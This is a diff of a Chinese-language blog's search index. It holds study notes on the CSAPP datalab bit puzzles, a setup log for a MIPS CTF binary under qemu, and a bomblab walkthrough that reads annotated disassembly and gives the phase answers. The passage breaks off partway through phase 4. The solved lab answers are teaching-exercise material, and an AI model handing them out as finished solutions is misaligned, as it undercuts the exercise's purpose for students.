@@ -1,6 +1,89 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>datalab</title>
+    <url>/2020/07/23/datalab/</url>
+    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
+<p><img src="/2020/07/23/datalab/image-20200720182358141.png" alt="image-20200720182358141"></p>
+<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
+<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
+<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
+<p>太大了，用移位</p>
+<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
+<ul>
+<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
+<li>除了最大值，-1也有同样的情况</li>
+</ul>
+<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
+<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
+<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
+<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
+<p>-x = ~x + 1</p>
+<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
+<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
+<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
+<p>判断x是否非零：!!x</p>
+<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
+<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
+<ul>
+<li>符号相反，如果y为正数，为1</li>
+<li>符号相同，相减 &gt; 0为1</li>
+<li>两数相等（异或实现），返回1</li>
+</ul>
+<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
+<p>正负零的符号位都是0</p>
+<p>取反与1&amp;，正负再&amp;</p>
+<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
+<p>特殊情况</p>
+<ul>
+<li>0 : 1</li>
+<li>1 : 1</li>
+</ul>
+<p>正数：最高位1的位置 + 1（符号位）</p>
+<p>负数：求反码，同正数</p>
+<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
+<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
+<p>特殊情况</p>
+<ul>
+<li>NaN：直接将参数返回回去</li>
+<li>区别规格化数和非规格化数</li>
+</ul>
+<p>单精度浮点内部</p>
+<p><img src="/2020/07/23/datalab/image-20200720214424119.png" alt="image-20200720214424119"></p>
+<p>NaN</p>
+<p><img src="/2020/07/23/datalab/image-20200720214532080.png" alt="image-20200720214532080"></p>
+<p>正负无穷</p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C11.png" alt="11"></p>
+<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
+<p>情况：</p>
+<ul>
+<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
+</li>
+<li><p>如果大于31，大了，直接返回0x80000000u</p>
+</li>
+<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
+<ul>
+<li>E &lt; 23，说明后面还有小数部分</li>
+<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
+</ul>
+<p>最后，根据符号位，返回对应符号的frac</p>
+</li>
+</ul>
+<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
+<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
+<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
+<p>E = x;</p>
+<p>0 | bios + E | 23个0</p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.1.png" alt="13.1"></p>
+<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.2.png" alt="13.2"></p>
+<hr>
+<p><img src="/2020/07/23/datalab/image-20200720222037585.png" alt="image-20200720222037585"></p>
+]]></content>
+      <tags>
+        <tag>csapp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>beginner</title>
     <url>/2020/09/07/beginner/</url>
     <content><![CDATA[<h4 id="file文件"><a href="#file文件" class="headerlink" title="file文件"></a>file文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@winter-ubuntu16:~&#x2F;googlectf&#x2F;reverse-beginner$ file a.out </span><br><span class="line">a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;e3a5d8dc3eee0e960c602b9b2207150c91dc9dff, for GNU&#x2F;Linux 3.2.0, not strippd</span><br></pre></td></tr></table></figure>
@@ -72,6 +155,169 @@
       </tags>
   </entry>
   <entry>
+    <title>embedded(未完成)</title>
+    <url>/2020/10/22/embedded/</url>
+    <content><![CDATA[<h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
+<h3 id="传文件到qemu"><a href="#传文件到qemu" class="headerlink" title="传文件到qemu"></a>传文件到qemu</h3><p>将linux下的embedded_heap文件传入qemu：</p>
+<p>linux：sudo ifconfig tap0 12.0.0.2</p>
+<p>qemu：ifconfig eth0 12.0.0.1 </p>
+<p>遇到设备不存在，ifconfig，在开头看网卡名字</p>
+<p>ping通</p>
+<p>linux：python -m SimpleHTTPServer</p>
+<p>qemu：wget  12.0.0.2:8000/embedded_heap</p>
+<p><img src="/2020/10/22/embedded/image-20200831110650474.png" alt="image-20200831110650474"></p>
+<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>将两个so.0文件放到/lib文件下（注意：是根目录，，，）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mv libuClibc-0.9.33.2.so libc.so.0</span><br><span class="line">$ mv ld-uClibc-0.9.33.2.so ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/embedded/image-20200831191612015.png" alt="image-20200831191612015"></p>
+<p>qemu-mips  -L ./ ./embedded_heap</p>
+<p>也可以直接<code>./embedded_heap</code></p>
+<p>【可以使用的原因可能是因为binutils的存在用编译器自动转换了】</p>
+<p><strong>注意</strong></p>
+<p>还要修改lib文件下链接文件的权限</p>
+<p><img src="/2020/10/22/embedded/image-20200831191636914.png" alt="image-20200831191636914"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
+<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
+<hr>
+<h3 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h3><p><a href="https://baike.baidu.com/item/交叉编译/10916911" target="_blank" rel="noopener">交叉编译</a>（cross-compilation）是指，在某个主机平台上（比如PC上）用<a href="https://baike.baidu.com/item/交叉编译器/5125452" target="_blank" rel="noopener">交叉编译器</a>编译出可在其他平台上（比如ARM上）运行的代码的过程。</p>
+]]></content>
+      <categories>
+        <category>mips pwn</category>
+      </categories>
+      <tags>
+        <tag>iot</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bomblab</title>
+    <url>/2020/07/24/bomblab/</url>
+    <content><![CDATA[<p>总共六个阶段</p>
+<p>任务是，运行时，有六个阶段，每个阶段输入一个字符串，如果输入错误，炸弹爆炸。这次给的文件不全，所以，需要看汇编了解程序。</p>
+<p>导出汇编代码：<code>unix&gt; objdump -d &gt; obj.txt</code></p>
+<h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#main这块关于第一阶段的代码</span><br><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi						#读入的放入rdi</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br><span class="line">400e49:	e8 c2 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读入字符串，字符串地址存放在<code>rdi</code>中，然后呼叫<code>phase_1</code>函数，phase_defused和put都是输出提示性字符串</p>
+<p>每个阶段这块代码类似，字符串在<code>rdi</code>中。不再累赘。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#phase_1函数</span><br><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi					#把0x402400放入esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax						#执行and操作，如果两个相等，zf&#x3D;1</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>将0x402400地址存入<code>esi</code>，然后调用<code>strings_not_equal</code>函数，对返回结果<code>eax</code>进行查看，等于0成功，否则，炸弹爆炸</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#strings_not_equal函数</span><br><span class="line">0000000000401338 &lt;strings_not_equal&gt;:										&#x2F;&#x2F;相等，返回0，不相等，返回1</span><br><span class="line">  401338:	41 54                	push   %r12</span><br><span class="line">  40133a:	55                   	push   %rbp</span><br><span class="line">  40133b:	53                   	push   %rbx</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx						#读入的</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp						#0x402400</span><br><span class="line">  401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;			#把字符串放入rdi</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d         				#读入的长度放入r12d</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx				</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d						#0x402400的长度与读入的长度cmp</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;	#如果不相等，eax&#x3D;0x1,结束</span><br><span class="line">  </span><br><span class="line">																			#相等要返回长度，所以接下来要找到最前面0的位置(二分)</span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax						#如果相等，eax&#x3D;读入地址里面的内容</span><br><span class="line">																			#movzbl指令负责拷贝一个字节，并用0填充其目的操作数中的其余各位，这种扩展方式叫“零扩展”。</span><br><span class="line">  40135f:	84 c0                	test   %al,%al							#如果al&#x3D;0，eax&#x3D;0，结束</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;	#如果al！&#x3D;0</span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al					#第一个字节相比				</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;	#相等，rbx、rbp+1</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;	#不相等，eax&#x3D;0x1，返回</span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al					#继续比较下一个字节(rbp+1)</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)							#nop 是什么都不做的意思（no-operation）。这里填入 nop 是为了让后面的函数对齐到 16 字节处</span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;	#后面的字节不相等，eax&#x3D;1，返回</span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx						#相等，继续加</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax						#eax&#x3D;下一个地址里面的内容</span><br><span class="line">  40137d:	84 c0                	test   %al,%al							#继续比较al是否是0</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;	#不是，回去</span><br><span class="line">  401381:	ba 00 00 00 00       	mov    $0x0,%edx						#是，eax&#x3D;0</span><br><span class="line">  401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401388:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  40138f:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;</span><br><span class="line">  401396:	ba 01 00 00 00       	mov    $0x1,%edx</span><br><span class="line">  40139b:	89 d0                	mov    %edx,%eax</span><br><span class="line">  40139d:	5b                   	pop    %rbx</span><br><span class="line">  40139e:	5d                   	pop    %rbp</span><br><span class="line">  40139f:	41 5c                	pop    %r12</span><br><span class="line">  4013a1:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>通过分析可得，当<code>rdi</code>、<code>rsi</code>两个寄存器中地址对应的字符串内容，相等时，返回0，否则，返回1</p>
+<p>综上：</p>
+<p>当输入的字符串的内容和<code>0x402400</code>地址中的内容相等，即可通过。</p>
+<p><img src="/2020/07/24/bomblab/image-20200722183034318.png" alt="image-20200722183034318"></p>
+<p>Border relations with Canada have never been better.</p>
+<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  </span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi					#当前栈顶备份rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;	#主要是判断是否输入了六个数</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)					#栈顶数据必须是1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;		#如果相等，rbx&#x3D;rsp+0x4；rbp&#x3D;rsp+0x18，否则，爆炸</span><br><span class="line">																		#rbp指向最后一个数字的位置,rbx指向rsp下面一个单元</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax				#eax初始化是rsp栈顶的数据</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax					#eax×2</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)					#eax和rbx的值比较</span><br><span class="line">																		#(也就是下一个单元的数据和上一个单元比较)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;		</span><br><span class="line">																		#如果相等，rbx+0x4，否则，爆炸</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx					rbx和rbp比较，rbx和rbp如果不相等(没走完6个)，继续循环</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;		#rbx和rbp比较如果想等，结束</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx				#rbx(来判断的指针)，从rsp下面第一个数开始走			</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp		</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp					#六个走完，就结束了</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>所以，phase_2函数做的，就是将栈中的前六个单元的数据，相邻两个比较，如果2×上面单元地址 = 下面单元地址，才不会爆炸，又因为第一个是1（esp的值），六个，所以可以得到：</p>
+<p>栈内情况如下</p>
+<p> <img src="/2020/07/24/bomblab/image-20200722234727371.png" alt="image-20200722234727371"></p>
+<p>对于<code>read_six_numbers</code>函数，主要看一下几行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;		#输入h函数</span><br><span class="line">40148f:	83 f8 05             	cmp    $0x5,%eax					   #eax存放输入的参数个数，说明至少六个才行（eax返回6）</span><br><span class="line">401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;	#JG： 大于转移指令。</span><br><span class="line">401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401499:	48 83 c4 18          	add    $0x18,%rsp						#小于0x5，顺利退出</span><br><span class="line">40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>将参数压栈的操作</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400bf0 &lt;__isoc99_sscanf@plt&gt;:</span><br><span class="line">  400bf0:	ff 25 92 24 20 00    	jmpq   *0x202492(%rip)        # 603088 &lt;_GLOBAL_OFFSET_TABLE_+0xa0&gt;</span><br><span class="line">  400bf6:	68 11 00 00 00       	pushq  $0x11</span><br><span class="line">  400bfb:	e9 d0 fe ff ff       	jmpq   400ad0 &lt;_init+0x10&gt;		# jmpq 就是jmp 指令，q表示跳转到64位地址。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ad0 &lt;getenv@plt-0x10&gt;:</span><br><span class="line">  400ad0:	ff 35 1a 25 20 00    	pushq  0x20251a(%rip)        # 602ff0 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  400ad6:	ff 25 1c 25 20 00    	jmpq   *0x20251c(%rip)        # 602ff8 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  400adc:	0f 1f 40 00          	nopl   0x0(%rax)</span><br></pre></td></tr></table></figure>
+
+<p>应该是0x400ad0做的，，，（猜测）</p>
+<p>1 2 4 8 16 32</p>
+<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp						</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx					#rcx &#x3D; rsp + 0xc</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx					#rdx &#x3D; rsp + 0x8</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi					#esi &#x3D; 0x4025cf</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax						#eax &#x3D; 0x0</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax						</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;			#至少要输入两个参数</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)					#rsp + 0x8 与 0x7 做比较，需要小于</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;			#rsp + 0x8 大于 0x7 就爆炸了</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax					#eax &#x3D; rsp + 0x8</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)				#switch结构</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax						#eax &#x3D; 0xcf 	207</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax						#eax &#x3D; 0x2c3		rsp &#x3D; eax - 0xc</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax						#eax &#x3D; 0x100		256						</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax						#eax &#x3D; 0x185	389</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax						#eax &#x3D; 0xce		206</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax						#eax &#x3D; 0x2aa	682</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax						#eax &#x3D; 0x147	327</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;			#爆炸</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax					#比较eax 和 rsp + 0xc</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>这个阶段，只需要对该代码有较好的理解即可，主要是对分支（switch语句）的理解。</p>
+<p>对于sscanf函数，原型</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sscanf(const char* str,const char* format,...);</span><br></pre></td></tr></table></figure>
+
+<p>在这里，<code>esi</code>里面存放的是format的内容，<code>[esp+4]</code>、<code>[esp+0xc]</code>里面分别是第一第二个参数</p>
+<p><img src="/2020/07/24/bomblab/image-20200723015133883.png" alt="image-20200723015133883"></p>
+<p><img src="/2020/07/24/bomblab/image-20200723020444125.png" alt="image-20200723020444125"></p>
+<p>根据format和这两条语句，可以知道，参数为2。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f60:	83 f8 01             	cmp    $0x1,%eax						</span><br><span class="line">400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;			#至少要输入两个参数		#至少要输入两个参数</span><br></pre></td></tr></table></figure>
+
+<p>下面到了重点，也就是switch语句。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)				#switch结构</span><br><span class="line">400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax						#eax &#x3D; 0xcf 	207</span><br><span class="line">400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br></pre></td></tr></table></figure>
+
+<p>到内存中查看0x402470和0x402478</p>
+<p><img src="/2020/07/24/bomblab/image-20200723020928192.png" alt="image-20200723020928192"></p>
+<p><code>0x402470</code>是当rax=0时，<code>jmpq   *0x402470(,%rax,8)</code>调转到地址<code>0x402470</code>,当rax=1时，<code>jmpq   *0x402470(,%rax,8)</code>调转到地址<code>0x400fb9</code>，一次类推，只要eax属于（0，0xx7），就有它对应的解</p>
+<ul>
+<li>0    0xcf            207</li>
+<li>1    0x137         311</li>
+<li>2    0x2c3          707</li>
+<li>3    0x100          256</li>
+<li>4    0x185          389</li>
+<li>5    0xce            206</li>
+<li>6    0x2aa          682</li>
+<li>7    0x147          327</li>
+</ul>
+<p>共有八组解，都可以使用</p>
+<p>另外，如果不想奋斗看汇编，其实，可以ida里面看伪代码，分分钟秒杀</p>
+<p><img src="/2020/07/24/bomblab/image-20200723021624745.png" alt="image-20200723021624745"></p>
+<h3 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h3><p>读懂程序，就可以简单绕过了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp						</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax						#参数必须是两个</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)					#第一个参数必须小于等于0xe</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;			</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx						#edx &#x3D; 0xe</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi						#esi &#x3D; 0x0</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi					#edi &#x3D; rsp+0x8</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;					#func4</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax						#eax必须等于0</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;			</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)					#rsp + 0xc 要等于 0x0</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span 